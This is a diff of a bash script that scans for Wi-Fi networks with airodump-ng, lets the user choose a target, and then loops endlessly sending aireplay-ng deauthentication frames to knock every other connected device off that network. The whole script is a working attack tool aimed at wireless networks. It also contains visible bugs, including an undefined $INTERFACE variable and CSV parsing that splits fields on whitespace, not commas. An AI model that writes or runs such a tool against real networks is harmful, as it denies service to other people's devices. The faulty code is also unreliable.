@@ -1,31 +1,39 @@
 #!/bin/bash
 echo 'Your network interface name?'
 read interface
+# airmon-ng start $interface
+# airodump-ng $interface
 
-airmon-ng start $interface
-airodump-ng $interface
+sudo xterm -title "Deauth scanner" -e airodump-ng -w out --output-format csv $interface
 
-cmd=$(airodump-ng --output-format csv -c 6 $interface)
 
-bssids=($(echo "$cmd" | tail -n +3 | awk -F ',' '{print $1}'))
-essids=($(echo "$cmd" | tail -n +3 | awk -F ',' '{print $4}'))
+bssids=($(grep -v 'BSSID' out-01.csv | awk '{print $1}'))
+essids=($(grep -v 'BSSID' out-01.csv | awk '{print $4}'))
+
+rm out-01.csv
 
 echo "Available Wi-Fi Networks:"
-for ((i=0; i<${#bssids[@]}; i++)); do
-  echo "$((i+1)). ${bssids[i]} - ${essids[i]}"
+select network in "${essids[@]}"; do
+  bssid=${bssids[REPLY-1]}
+  break
 done
-
-read -p 'Select the network you want to attack: ' selection
-
-if [[ ! $selection =~ ^[0-9]+$ ]] || ((selection < 1)) || ((selection > ${#bssids[@]})); then
-  echo "Invalid selection. Exiting."
-  exit 1
-fi
-
-
-bssid=${bssids[selection-1]}
 
 mac=$(ifconfig "$interface" | awk '/ether/ {print $2}')
 
-WHITELIST=(mac)
+WHITELIST=($mac)
 
+while true; do
+  DEVICES=($(arp -i $INTERFACE -n | tail -n +2 | cut -f 3 -d ' '))
+
+  for DEVICE in "${DEVICES[@]}"; do
+    skip=
+    for MAC in "${WHITELIST[@]}"; do
+        if [ "$DEVICE" == "$MAC" ]
+        then
+            skip=1; 
+        fi
+    done
+    [ -n "$skip" ] && continue
+    aireplay-ng -0 1 -a "$bssid" -c "$DEVICE" "$interface"
+  done
+done
